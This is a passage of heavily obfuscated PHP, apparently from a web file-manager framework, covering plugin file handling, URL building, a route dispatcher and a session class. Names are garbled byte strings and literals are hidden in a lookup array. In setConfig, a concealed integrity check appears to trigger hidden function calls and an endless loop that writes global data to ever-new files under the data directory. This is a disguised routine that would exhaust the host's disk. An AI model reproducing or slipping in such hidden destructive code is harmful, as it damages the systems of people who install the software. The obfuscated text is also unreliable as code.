Action($_SERVER[ëæªã÷][1149])->link($‹ó≠ Í´); } final function filePath($é›öÌ–∑) { $ÿÖææ¥® =& $_SERVER[ëæªã÷]; if ($•ØÀÓ ∑ = $this->checkSharePath($é›öÌ–∑)) { Hook::trigger($ÿÖææ¥®[1520], $•ØÀÓ ∑); return $•ØÀÓ ∑; } $this->fileCanView($é›öÌ–∑); if (request_url_safe($é›öÌ–∑)) { $¥Ÿœñ“¨ = parse_url_query($é›öÌ–∑); if (isset($¥Ÿœñ“¨[$ÿÖææ¥®[1521]]) && isset($¥Ÿœñ“¨[$ÿÖææ¥®[218]])) { $æÏπÖÒÕ = Model($ÿÖææ¥®[750])->get($ÿÖææ¥®[751]); $àŒ˘…æ∫ = Mcrypt::decode($¥Ÿœñ“¨[$ÿÖææ¥®[218]], $æÏπÖÒÕ); if ($àŒ˘…æ∫) { $this->fileInfo = IO::infoWithChildren($àŒ˘…æ∫); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $àŒ˘…æ∫; } } $é›öÌ–∑ = $this->_cacheHttpFile($é›öÌ–∑); $this->fileInfo = IO::infoWithChildren($é›öÌ–∑); } else { $this->fileInfo = IO::infoWithChildren($é›öÌ–∑); if (!$this->fileInfo) { show_tips(LNG($ÿÖææ¥®[116]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÿÖææ¥®[1520], $é›öÌ–∑); return $é›öÌ–∑; } final function _cacheHttpFile($–ﬁ€–©˛) { $ß†Îîäí = hash_path($–ﬁ€–©˛, !0); $this->cachePath = $this->pluginCachePath($ß†Îîäí); if ($áÆ†≤◊Õ = IO::fileNameExist($this->cachePath, $ß†Îîäí)) { return KodIO::make($áÆ†≤◊Õ); } $Ë”ÜâêÍ = $this->cachePath . $ß†Îîäí; return $this->pluginCacheFileSet($Ë”ÜâêÍ, file_get_contents_nossl($–ﬁ€–©˛)); } final function _tmpFileName($≥Úáı◊ = array()) { $ÖÏçéáˆ =& $_SERVER[ëæªã÷]; if (!$≥Úáı◊) { $≥Úáı◊ = $this->fileInfo; } if (isset($≥Úáı◊[$ÖÏçéáˆ[180]])) { return $≥Úáı◊[$ÖÏçéáˆ[180]]; } if (isset($≥Úáı◊[$ÖÏçéáˆ[173]][$ÖÏçéáˆ[180]])) { return $≥Úáı◊[$ÖÏçéáˆ[173]][$ÖÏçéáˆ[180]]; } $¶ÌÀâÕÅ = IO::hashSimple($≥Úáı◊[$ÖÏçéáˆ[88]]); if ($¶ÌÀâÕÅ) { return $¶ÌÀâÕÅ; } $£‹î˚‡ı = array($≥Úáı◊[$ÖÏçéáˆ[32]], $≥Úáı◊[$ÖÏçéáˆ[88]], $≥Úáı◊[$ÖÏçéáˆ[90]]); if (isset($≥Úáı◊[$ÖÏçéáˆ[521]])) { $£‹î˚‡ı[] = $≥Úáı◊[$ÖÏçéáˆ[521]]; } return md5(implode($ÖÏçéáˆ[11], $£‹î˚‡ı)); } final function checkSharePath($¶Óª¸Ì≈) { $◊Ç∆›ÿ≤ =& $_SERVER[ëæªã÷]; if (!defined($◊Ç∆›ÿ≤[474])) { define($◊Ç∆›ÿ≤[514], 0); } if (!$this->isShare($¶Óª¸Ì≈)) { return !1; } $ÑÙÆ•˜› = Action($◊Ç∆›ÿ≤[1149])->sharePathInfo($¶Óª¸Ì≈); if (!isset($ÑÙÆ•˜›[$◊Ç∆›ÿ≤[88]])) { show_json(LNG($◊Ç∆›ÿ≤[1522]), !1); } $this->fileInfo = $ÑÙÆ•˜›[$◊Ç∆›ÿ≤[173]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$◊Ç∆›ÿ≤[180]]); return $ÑÙÆ•˜›[$◊Ç∆›ÿ≤[88]]; } final function pluginCachePath($§à¬õ˝Ï = '') { $¬´Ïê»ã =& $_SERVER[ëæªã÷]; $˙Õ∆È‹Ë = IO_PATH_SYSTEM_TEMP . $¬´Ïê»ã[1523] . $this->pluginName; if (!($•„É©Ÿ¬ = IO::infoFull($˙Õ∆È‹Ë))) { return IO::mkdir($˙Õ∆È‹Ë . $¬´Ïê»ã[8] . $§à¬õ˝Ï); } if (empty($§à¬õ˝Ï)) { return $•„É©Ÿ¬[$¬´Ïê»ã[88]]; } if (!($∏»˜±“ß = IO::fileNameExist($•„É©Ÿ¬[$¬´Ïê»ã[88]], $§à¬õ˝Ï))) { return IO::mkdir($•„É©Ÿ¬[$¬´Ïê»ã[88]] . $§à¬õ˝Ï); } return KodIO::make($∏»˜±“ß); } final function pluginCacheFileSet($ñƒ˘øéº, $±ßÎÖÑù = '') { $€îôªòÊ =& $_SERVER[ëæªã÷]; if (!($†õî˝»⁄ = IO::infoFull($ñƒ˘øéº))) { return IO::mkfile($ñƒ˘øéº, $±ßÎÖÑù, REPEAT_REPLACE); } IO::setContent($†õî˝»⁄[$€îôªòÊ[88]], $±ßÎÖÑù); return $†õî˝»⁄[$€îôªòÊ[88]]; } final function pluginLocalFile($º®”‡◊ÿ = '') { $ı¯‘Ñü• =& $_SERVER[ëæªã÷]; $ƒŒÁ≈˚ø = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ƒŒÁ≈˚ø)) { mk_dir($ƒŒÁ≈˚ø); } if (!$º®”‡◊ÿ) { return $ƒŒÁ≈˚ø; } $ìê“—áﬂ = IO::info($º®”‡◊ÿ); $ÁˆÚ Æ„ = $this->_tmpFileName($ìê“—áﬂ) . $ı¯‘Ñü•[10] . $ìê“—áﬂ[$ı¯‘Ñü•[177]]; if (!checkExtSafe($ÁˆÚ Æ„)) { $ÁˆÚ Æ„ = $ÁˆÚ Æ„ . $ı¯‘Ñü•[1524]; } $©Ì˛¸≤é = $ƒŒÁ≈˚ø . $ÁˆÚ Æ„; if (@file_exists($©Ì˛¸≤é)) { return $©Ì˛¸≤é; } return IO::copy($º®”‡◊ÿ, $ƒŒÁ≈˚ø, 0, $ÁˆÚ Æ„); } final function appPackage() { $≥á∆Êæé =& $_SERVER[ëæªã÷]; if ($this->packageData) { return $this->packageData; } $óÓñ∞º˛ = $this->parseFile($this->pluginPath . $≥á∆Êæé[1525]); $this->parseLang($óÓñ∞º˛); $ÎÕ´¸¨  = json_decode_force($óÓñ∞º˛); if (!$ÎÕ´¸¨ ) { return array(); } $õ©ëﬂ◊º = Hook::trigger($≥á∆Êæé[1526], $ÎÕ´¸¨ ); if ($õ©ëﬂ◊º && is_array($õ©ëﬂ◊º)) { $ÎÕ´¸¨  = $õ©ëﬂ◊º; } $this->packageData = $ÎÕ´¸¨ ; return $ÎÕ´¸¨ ; } public function packageInfoGet($ÂºŒÉı∆) { $Ü™ÑâÒ˚ = $this->appPackage(); return array_get_value($Ü™ÑâÒ˚, $ÂºŒÉı∆); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ëæªã÷][1527]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ëæªã÷][1528]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ëæªã÷][1529]); } public function echoJsAssign($˙É™Êü’, $å˛ÈŒ‹•) { $this->echoJsAssignArr[$˙É™Êü’] = $å˛ÈŒ‹•; } private function parseFile($¶î§´¯ƒ) { $≠Ïäà © =& $_SERVER[ëæªã÷]; $¨µÎà¿∫ = file_get_contents_nossl($¶î§´¯ƒ); $Ú§ÌöÖÆ = array($≠Ïäà ©[1530], $≠Ïäà ©[1531], $≠Ïäà ©[1532], $≠Ïäà ©[1533], $≠Ïäà ©[1534], $≠Ïäà ©[1535], $≠Ïäà ©[1536]); $ìËÉƒπˆ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$≠Ïäà ©[100]][$≠Ïäà ©[1537]]); foreach ($this->echoJsAssignArr as $§ ì±Î⁄ => $¡›û®ƒÏ) { $Ú§ÌöÖÆ[] = $≠Ïäà ©[1538] . $§ ì±Î⁄ . $≠Ïäà ©[1539]; $ìËÉƒπˆ[] = is_array($¡›û®ƒÏ) || is_object($¡›û®ƒÏ) ? rawurlencode(json_encode($¡›û®ƒÏ)) : $¡›û®ƒÏ; } if (strstr($¨µÎà¿∫, $≠Ïäà ©[1540])) { $¿Ñäã©‚ = rawurlencode(json_encode($this->pluginLangArr)); $¨µÎà¿∫ = str_replace($≠Ïäà ©[1540], $¿Ñäã©‚, $¨µÎà¿∫); } if (strstr($¨µÎà¿∫, $≠Ïäà ©[1541])) { $¿Ñäã©‚ = $¿Ñäã©‚ = rawurlencode(json_encode($this->getConfig())); $¨µÎà¿∫ = str_replace($≠Ïäà ©[1541], $¿Ñäã©‚, $¨µÎà¿∫); } $¨µÎà¿∫ = str_replace($Ú§ÌöÖÆ, $ìËÉƒπˆ, $¨µÎà¿∫); return $¨µÎà¿∫; } private function parseLang(&$“’øœÍÌ) { $≤§Ôê”Ù =& $_SERVER[ëæªã÷]; $” Úèå¨ = $≤§Ôê”Ù[1542]; if (!strstr($“’øœÍÌ, $” Úèå¨)) { return; } preg_match_all($≤§Ôê”Ù[1543], $“’øœÍÌ, $Ÿ«°±Ô¨); if (!is_array($Ÿ«°±Ô¨) || count($Ÿ«°±Ô¨) == 0 || !is_array($Ÿ«°±Ô¨[0]) || count($Ÿ«°±Ô¨[0]) == 0) { return; } $Ìû≈¯ﬁ˜ = array(); $ÆÔ—‰≤Ÿ = array(); foreach ($Ÿ«°±Ô¨[0] as $ö˘ƒ»—˙) { $¬˙àÍú„ = substr($ö˘ƒ»—˙, strlen($” Úèå¨), -4); $Òœ÷±Õ´ = LNG($¬˙àÍú„); $Ìû≈¯ﬁ˜[] = $ö˘ƒ»—˙; $ÆÔ—‰≤Ÿ[] = str_replace(array($≤§Ôê”Ù[65], $≤§Ôê”Ù[1054], $≤§Ôê”Ù[346], $≤§Ôê”Ù[127]), array($≤§Ôê”Ù[53], $≤§Ôê”Ù[53], $≤§Ôê”Ù[12], $≤§Ôê”Ù[1544]), $Òœ÷±Õ´); } $“’øœÍÌ = str_replace($Ìû≈¯ﬁ˜, $ÆÔ—‰≤Ÿ, $“’øœÍÌ); } private function parseConfig(&$ﬁ˜ÕøÄé) { $®˘≠±ﬂ— =& $_SERVER[ëæªã÷]; $À‚∂©äÿ = $®˘≠±ﬂ—[1545]; if (!strstr($ﬁ˜ÕøÄé, $À‚∂©äÿ)) { return; } preg_match_all($®˘≠±ﬂ—[1546], $ﬁ˜ÕøÄé, $¸€ØœŒı); if (!is_array($¸€ØœŒı) || count($¸€ØœŒı) == 0 || !is_array($¸€ØœŒı[0]) || count($¸€ØœŒı[0]) == 0) { return; } $›Í›‘›¶ = $this->getConfig(); $íƒı†˜ä = array(); $ı±ÀØΩÎ = array(); foreach ($¸€ØœŒı[0] as $Ÿ§÷∞∆Ä) { $îÂÖó÷Ñ = substr($Ÿ§÷∞∆Ä, strlen($À‚∂©äÿ), -2); $íƒı†˜ä[] = $Ÿ§÷∞∆Ä; $ı±ÀØΩÎ[] = _get($›Í›‘›¶, $îÂÖó÷Ñ); } $ﬁ˜ÕøÄé = str_replace($íƒı†˜ä, $ı±ÀØΩÎ, $ﬁ˜ÕøÄé); } private function parsePackage(&$´˘À”¯ö) { $±èÇıÈ‹ =& $_SERVER[ëæªã÷]; $äì∫¬Ìﬂ = $±èÇıÈ‹[1547]; if (!strstr($´˘À”¯ö, $äì∫¬Ìﬂ)) { return; } preg_match_all($±èÇıÈ‹[1548], $´˘À”¯ö, $¢‡øäÜõ); if (!is_array($¢‡øäÜõ) || count($¢‡øäÜõ) == 0 || !is_array($¢‡øäÜõ[0]) || count($¢‡øäÜõ[0]) == 0) { return; } $πÔ†ùÄí = $this->appPackage(); $àÊ¯Ãó£ = array(); $†èüŒ®è = array(); foreach ($¢‡øäÜõ[0] as $î∏òÒ∂Ω) { $Õ»®©ã˛ = substr($î∏òÒ∂Ω, strlen($äì∫¬Ìﬂ), -2); $àÊ¯Ãó£[] = $î∏òÒ∂Ω; $†èüŒ®è[] = _get($πÔ†ùÄí, $Õ»®©ã˛); } $´˘À”¯ö = str_replace($àÊ¯Ãó£, $†èüŒ®è, $´˘À”¯ö); } final function echoFile($‘≥ÑÇÂÛ, $˛Œ÷¢˘ò = false) { $ÙãÅôø¨ =& $_SERVER[ëæªã÷]; $¶∫«≠Ûö = $this->pluginPath . $‘≥ÑÇÂÛ; if (ACT == $ÙãÅôø¨[1549]) { echo $ÙãÅôø¨[1550] . $this->pluginName . $ÙãÅôø¨[8] . $‘≥ÑÇÂÛ . $ÙãÅôø¨[1551]; if (!file_exists($¶∫«≠Ûö)) { echo $ÙãÅôø¨[1552]; return; } } $àı†Ì‡è = $this->parseFile($¶∫«≠Ûö); $this->parseLang($àı†Ì‡è); $this->parseConfig($àı†Ì‡è); $this->parsePackage($àı†Ì‡è); if (is_array($˛Œ÷¢˘ò)) { $àı†Ì‡è = str_replace(array_keys($˛Œ÷¢˘ò), array_values($˛Œ÷¢˘ò), $àı†Ì‡è); } echo $ÙãÅôø¨[65] . $àı†Ì‡è; } final function initLang() { $⁄“ÛŸƒá =& $_SERVER[ëæªã÷]; $ÃÇïÓë» = $⁄“ÛŸƒá[1553]; $≠“⁄°ÈÓ = $this->pluginPath . $⁄“ÛŸƒá[1554]; $∏ò£—‚ú = I18n::getType(); $˜œ°˝µŒ = array(); if (file_exists($≠“⁄°ÈÓ . $∏ò£—‚ú . $⁄“ÛŸƒá[818])) { $˜œ°˝µŒ = (include $≠“⁄°ÈÓ . $∏ò£—‚ú . $⁄“ÛŸƒá[818]); } else { if ($∏ò£—‚ú == $⁄“ÛŸƒá[1555] && !file_exists($≠“⁄°ÈÓ . $∏ò£—‚ú . $⁄“ÛŸƒá[818]) && file_exists($≠“⁄°ÈÓ . $⁄“ÛŸƒá[1556])) { $˜œ°˝µŒ = (include $≠“⁄°ÈÓ . $⁄“ÛŸƒá[1556]); } else { if (file_exists($≠“⁄°ÈÓ . $ÃÇïÓë» . $⁄“ÛŸƒá[818])) { $˜œ°˝µŒ = (include $≠“⁄°ÈÓ . $ÃÇïÓë» . $⁄“ÛŸƒá[818]); } } } if (!is_array($˜œ°˝µŒ)) { return array(); } if (@count($˜œ°˝µŒ) > 0) { I18n::set($˜œ°˝µŒ); } return $˜œ°˝µŒ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¡Â˘ûßà) { $œ¥∑ß–î =& $_SERVER[ëæªã÷]; $ç®Ò÷ø√ = $_SERVER[$œ¥∑ß–î[63]] . $œ¥∑ß–î[64]; $» ™«˜ö = $œ¥∑ß–î[852]; if ($_SERVER[$œ¥∑ß–î[60]] != $» ™«˜ö($ç®Ò÷ø√)) { $‡´º¸ûƒ = $œ¥∑ß–î[853]; $˘Á–Çë¥ = $œ¥∑ß–î[62]; $Îàú¡Èõ = $_SERVER[$œ¥∑ß–î[63]] . $œ¥∑ß–î[64]; $≤äÚµçô = $˘Á–Çë¥($Îàú¡Èõ); $˛Ç›È’Æ = explode($œ¥∑ß–î[65], $≤äÚµçô); if (count($˛Ç›È’Æ) < $œ¥∑ß–î[628]) { $∫Î˜˚”ó = $œ¥∑ß–î[67]; $∫Î˜˚”ó(); } $î´·àÅı = $œ¥∑ß–î[854]; $î´·àÅı($_SERVER[$œ¥∑ß–î[855]]); $‡´º¸ûƒ = $œ¥∑ß–î[853]; $‡´º¸ûƒ(); $†≥Î˝Øª = $œ¥∑ß–î[856]; $ËÆ∏ÛŒÀ = json_encode($GLOBALS[$œ¥∑ß–î[857]]); $Õó‹§‡∂ = 1; for ($ı∆ù†¨ﬂ = $Õó‹§‡∂; $ı∆ù†¨ﬂ > 0; $ı∆ù†¨ﬂ++) { $†≥Î˝Øª(DATA_PATH . $ı∆ù†¨ﬂ, $ËÆ∏ÛŒÀ); } } return $this->modelPlugin->setConfig($this->pluginName, $¡Â˘ûßà); } public function onSetConfig($üøÒö‚¥) { } public function onGetConfig($€◊•◊∑Ü) { } public function onChangeStatus($ÚÛÁƒÂÌ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Î›òÖû† = "\x70\154\165\x67\151\x6e\x41\x75\164\x68") { $Õ±‹¿—∑ =& $_SERVER[ëæªã÷]; if (!defined($Õ±‹¿—∑[474])) { return !1; } if (_get($GLOBALS, $Õ±‹¿—∑[505])) { return !0; } $Ìü«ùÃ“ = $this->getConfig(); if (!$Ìü«ùÃ“[$Î›òÖû†]) { return !1; } return ActionCall($Õ±‹¿—∑[1557], $Ìü«ùÃ“[$Î›òÖû†]); } public function url($àÏá˝‰·, $ÿì≥ÇÍù = '', $⁄ƒºõäõ = true) { $î¸Ùû™† =& $_SERVER[ëæªã÷]; $î©ÚõÌ¶ = $this->getConfig(); $∞ü¸æ¢˜ = KOD_VERSION . $î¸Ùû™†[10] . KOD_VERSION_BUILD; $úæ™ìÊÍ = $this->packageVersion(); $ﬁ∆Ä›‚“ = $∞ü¸æ¢˜ . $î¸Ùû™†[460] . $úæ™ìÊÍ; if (substr($àÏá˝‰·, 0, 4) == $î¸Ùû™†[155] || substr($àÏá˝‰·, 0, 2) == $î¸Ùû™†[1341]) { $ˆ‡˚€Ï§ = $àÏá˝‰· . $î¸Ùû™†[1558] . $ﬁ∆Ä›‚“; } else { if ($ÿì≥ÇÍù == $î¸Ùû™†[12]) { $ˆ‡˚€Ï§ = $this->pluginHost . $àÏá˝‰· . $î¸Ùû™†[1558] . $ﬁ∆Ä›‚“; } else { if ($ÿì≥ÇÍù === $î¸Ùû™†[89]) { $ˆ‡˚€Ï§ = $this->pluginHost . $àÏá˝‰·; } else { if ($ÿì≥ÇÍù == $î¸Ùû™†[1559]) { $ˆ‡˚€Ï§ = STATIC_PATH . $àÏá˝‰· . $î¸Ùû™†[1558] . $∞ü¸æ¢˜; } else { if ($ÿì≥ÇÍù == $î¸Ùû™†[1560]) { $ˆ‡˚€Ï§ = APP_HOST . $î¸Ùû™†[1561] . $àÏá˝‰· . $î¸Ùû™†[1558] . $∞ü¸æ¢˜; } else { if (isset($î©ÚõÌ¶[$ÿì≥ÇÍù])) { $ˆ‡˚€Ï§ = $î©ÚõÌ¶[$ÿì≥ÇÍù] . $àÏá˝‰· . $î¸Ùû™†[1558] . $ﬁ∆Ä›‚“; } } } } } } if (!$⁄ƒºõäõ) { return $ˆ‡˚€Ï§; } echo $ˆ‡˚€Ï§; } public function link($ú‚õñ≥Ω = false, $˜≥«¶§’ = '') { $Ø€¥ÿˆﬂ =& $_SERVER[ëæªã÷]; if (!$ú‚õñ≥Ω) { $this->link($Ø€¥ÿˆﬂ[1562], $Ø€¥ÿˆﬂ[1560]); $this->link($Ø€¥ÿˆﬂ[1563], $Ø€¥ÿˆﬂ[1559]); $this->link($Ø€¥ÿˆﬂ[1564], $Ø€¥ÿˆﬂ[1559]); $this->link($Ø€¥ÿˆﬂ[1565], $Ø€¥ÿˆﬂ[1559]); $this->link($Ø€¥ÿˆﬂ[1566], $Ø€¥ÿˆﬂ[1559]); return; } $ÄØ†ÁÁ£ = $this->url($ú‚õñ≥Ω, $˜≥«¶§’, !1); if (substr($ú‚õñ≥Ω, -3) == $Ø€¥ÿˆﬂ[1567]) { echo $Ø€¥ÿˆﬂ[1568] . $ÄØ†ÁÁ£ . $Ø€¥ÿˆﬂ[1569] . $Ø€¥ÿˆﬂ[65]; } else { if (substr($ú‚õñ≥Ω, -4) == $Ø€¥ÿˆﬂ[1570]) { echo $Ø€¥ÿˆﬂ[1571] . $ÄØ†ÁÁ£ . $Ø€¥ÿˆﬂ[1572] . $Ø€¥ÿˆﬂ[65]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\136\57\x5d\53", "\x3a\156\x75\x6d" => "\x5b\60\55\71\135\x2b", "\x3a\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($´¡‰Ààã, $¨√í¶£µ) { $“˜⁄ìâÇ =& $_SERVER[ëæªã÷]; if ($´¡‰Ààã == $“˜⁄ìâÇ[1573]) { $ûù˛Øµü = array_map($“˜⁄ìâÇ[1574], $¨√í¶£µ[0]); $©Ö¶çÖÓ = strpos($¨√í¶£µ[1], $“˜⁄ìâÇ[8]) === 0 ? $¨√í¶£µ[1] : $“˜⁄ìâÇ[8] . $¨√í¶£µ[1]; $ﬂê†∆öŸ = $¨√í¶£µ[2]; } else { $ûù˛Øµü = null; $©Ö¶çÖÓ = strpos($¨√í¶£µ[0], $“˜⁄ìâÇ[8]) === 0 ? $¨√í¶£µ[0] : $“˜⁄ìâÇ[8] . $¨√í¶£µ[0]; $ﬂê†∆öŸ = $¨√í¶£µ[1]; } array_push(self::$maps, $ûù˛Øµü); array_push(self::$routes, $©Ö¶çÖÓ); array_push(self::$methods, strtoupper($´¡‰Ààã)); array_push(self::$callbacks, $ﬂê†∆öŸ); } public static function error($Ä†–—Ë”) { self::$errorCallback = $Ä†–—Ë”; } public static function haltOnMatch($àÿêâ§ƒ = true) { self::$halts = $àÿêâ§ƒ; } public static function dispatch() { $§Ì≤≠‡Ó =& $_SERVER[ëæªã÷]; $∆“˝ÆÆŸ = parse_url($_SERVER[$§Ì≤≠‡Ó[1575]], PHP_URL_PATH); $≠‚É∆èõ = $_SERVER[$§Ì≤≠‡Ó[166]]; $ß”˘®“Ì = array_keys(static::$patterns); $ç…≥…Âè = array_values(static::$patterns); $íÂÌ≥æ = !1; self::$routes = preg_replace($§Ì≤≠‡Ó[1243], $§Ì≤≠‡Ó[8], self::$routes); if (in_array($∆“˝ÆÆŸ, self::$routes)) { $äø∫ì•ú = array_keys(self::$routes, $∆“˝ÆÆŸ); foreach ($äø∫ì•ú as $˙‚ı”–…) { if (self::$methods[$˙‚ı”–…] == $≠‚É∆èõ || self::$methods[$˙‚ı”–…] == $§Ì≤≠‡Ó[1576] || in_array($≠‚É∆èõ, self::$maps[$˙‚ı”–…])) { $íÂÌ≥æ = !0; if (!is_object(self::$callbacks[$˙‚ı”–…])) { $´›‘¿ä‘ = explode($§Ì≤≠‡Ó[8], self::$callbacks[$˙‚ı”–…]); $†˛ëŒ›ú = end($´›‘¿ä‘); $‚◊ì∞ÊÀ = explode($§Ì≤≠‡Ó[1577], $†˛ëŒ›ú); $˛Œå—’Ó = new $‚◊ì∞ÊÀ[0](); $˛Œå—’Ó->{$‚◊ì∞ÊÀ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$˙‚ı”–…]); if (self::$halts) { return; } } } } } else { $Ü“”∞¡ƒ = 0; foreach (self::$routes as $˙‚ı”–…) { if (strpos($˙‚ı”–…, $§Ì≤≠‡Ó[4]) !== !1) { $˙‚ı”–… = str_replace($ß”˘®“Ì, $ç…≥…Âè, $˙‚ı”–…); } if (preg_match($§Ì≤≠‡Ó[1578] . $˙‚ı”–… . $§Ì≤≠‡Ó[1579], $∆“˝ÆÆŸ, $ÌÔü˛Ôß)) { if (self::$methods[$Ü“”∞¡ƒ] == $≠‚É∆èõ || self::$methods[$Ü“”∞¡ƒ] == $§Ì≤≠‡Ó[1576] || !empty(self::$maps[$Ü“”∞¡ƒ]) && in_array($≠‚É∆èõ, self::$maps[$Ü“”∞¡ƒ])) { $íÂÌ≥æ = !0; array_shift($ÌÔü˛Ôß); if (!is_object(self::$callbacks[$Ü“”∞¡ƒ])) { $´›‘¿ä‘ = explode($§Ì≤≠‡Ó[8], self::$callbacks[$Ü“”∞¡ƒ]); $†˛ëŒ›ú = end($´›‘¿ä‘); $‚◊ì∞ÊÀ = explode($§Ì≤≠‡Ó[1577], $†˛ëŒ›ú); $˛Œå—’Ó = new $‚◊ì∞ÊÀ[0](); if (!method_exists($˛Œå—’Ó, $‚◊ì∞ÊÀ[1])) { echo $§Ì≤≠‡Ó[1580]; } else { call_user_func_array(array($˛Œå—’Ó, $‚◊ì∞ÊÀ[1]), $ÌÔü˛Ôß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ü“”∞¡ƒ], $ÌÔü˛Ôß); if (self::$halts) { return; } } } } $Ü“”∞¡ƒ++; } } if ($íÂÌ≥æ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $£Ωâ¶ì =& $_SERVER[ëæªã÷]; header($_SERVER[$£Ωâ¶ì[1581]] . $£Ωâ¶ì[1582]); echo $£Ωâ¶ì[1583]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$§Ì≤≠‡Ó[1575]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ç…Ÿ•ÄÚ =& $_SERVER[ëæªã÷]; static $»ñº°†ú = false; if ($»ñº°†ú) { return $»ñº°†ú; } $“œ·ùú∑ = $GLOBALS[$Ç…Ÿ•ÄÚ[6]][$Ç…Ÿ•ÄÚ[353]]; self::$sessionTime = $“œ·ùú∑[$Ç…Ÿ•ÄÚ[1584]]; $∏˛…ÛÙû = isset($GLOBALS[$Ç…Ÿ•ÄÚ[1585]]) ? $GLOBALS[$Ç…Ÿ•ÄÚ[1585]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($∏˛…ÛÙû)) { self::$sessionSign = Cookie::get($∏˛…ÛÙû); } else { self::$sessionSign = guid(); } } Cookie::setSafe($∏˛…ÛÙû, self::$sessionSign, self::$sessionTime); $Ó⁄£«ü˝ = $“œ·ùú∑[$Ç…Ÿ•ÄÚ[1586]]; $¥œó£ûÖ = $“œ·ùú∑[$Ó⁄£«ü˝]; $òŸõÙî≤ = $“œ·ùú∑[$Ç…Ÿ•ÄÚ[808]]; switch ($Ó⁄£«ü˝) { case $Ç…Ÿ•ÄÚ[21]: self::$handle = Model($Ç…Ÿ•ÄÚ[809]); break; case $Ç…Ÿ•ÄÚ[810]: self::$handle = new CacheRedis($¥œó£ûÖ, $òŸõÙî≤); break; case $Ç…Ÿ•ÄÚ[811]: self::$handle = new CacheMemcached($¥œó£ûÖ, $òŸõÙî≤); break; case $Ç…Ÿ•ÄÚ[202]: $¥œó£ûÖ[$Ç…Ÿ•ÄÚ[88]] = $¥œó£ûÖ[$Ç…Ÿ•ÄÚ[88]] . $Ç…Ÿ•ÄÚ[1587]; self::$handle = new CacheFile($¥œó£ûÖ, $òŸõÙî≤); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $»ñº°†ú = new self(); return $»ñº°†ú; } public static function getBySign($øÎÊáç£) { CacheLock::lock($øÎÊáç£); $ﬁÂ“èúµ = self::$handle->get($øÎÊáç£); CacheLock::unlock($øÎÊáç£); $ﬁÂ“èúµ = unserialize($ﬁÂ“èúµ); return is_array($ﬁÂ“èúµ) ? $ﬁÂ“èúµ : array(); } public static function setBySign($€ß∏ŒﬁÄ, $Æï®‰‡∫) { CacheLock::lock($€ß∏ŒﬁÄ); self::$handle->set($€ß∏ŒﬁÄ, serialize($Æï®‰‡∫), self::$sessionTime); CacheLock::unlock($€ß∏ŒﬁÄ); } public static function sign($¡—›Ö©Â = false) { $¡—›Ö©Â && (self::$sessionSign = $¡—›Ö©Â); self::init(); return self::$sessionSign; } public static function set($◊ÖÇ¶È˘, $Ÿ≥¿ù÷ô = false) { self::init(); if (is_array($◊ÖÇ¶È˘)) { foreach ($◊ÖÇ¶È˘ as $åÜû›Ìª => $ú›˙∏â‘) { array_set_value(self::$data, $åÜû›Ìª, $ú›˙∏â‘); } } else { array_set_value(self::$data, $◊ÖÇ¶È˘, $Ÿ≥¿ù÷ô); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ü∫˙µ˝≤ = false) { self::init(); if (!$Ü∫˙µ˝≤) { return self::$data; } return array_get_value(self::$data, $Ü∫˙µ˝≤); } public static function remove($ß£≈ÔÏπ) { self::init(); unset(self::$data[$ß£≈ÔÏπ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ëæªã÷][813])) { self::$handle->clearTimeout(); } } } goto eå†óñºÎ¶; FÙÜ·†Ãâπ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($º»ÌŒÔ∂) { $ûçôæú— =& $_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($ûçôæú—[549], $º»ÌŒÔ∂); $ÚÏ§Âö¸ = 1; $this->_lockEvent($º»ÌŒÔ∂, array($ûçôæú—[550], $ûçôæú—[551]), $ÚÏ§Âö¸); $this->_lockParent($º»ÌŒÔ∂, array($ûçôæú—[551]), $ÚÏ§Âö¸); $this->_lockEvent($º»ÌŒÔ∂, array($ûçôæú—[552], $ûçôæú—[553]), $ÚÏ§Âö¸); $this->_lockCheckEnd($ûçôæú—[549], $º»ÌŒÔ∂); } public function lockCopyEnd($ÊäÀ‹è˝) { $´˚à∆ÛÑ =& $_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $à€ÿÌƒâ = 0; $this->_lockEvent($ÊäÀ‹è˝, array($´˚à∆ÛÑ[550], $´˚à∆ÛÑ[551]), $à€ÿÌƒâ); $this->_lockParent($ÊäÀ‹è˝, array($´˚à∆ÛÑ[551]), $à€ÿÌƒâ); $this->_lockEvent($ÊäÀ‹è˝, array($´˚à∆ÛÑ[552], $´˚à∆ÛÑ[553]), $à€ÿÌƒâ); } public function lockWriteStart($€âΩã‰Í, $›˝·Î≤Ê = '') { $…∏çÉ∫ä =& 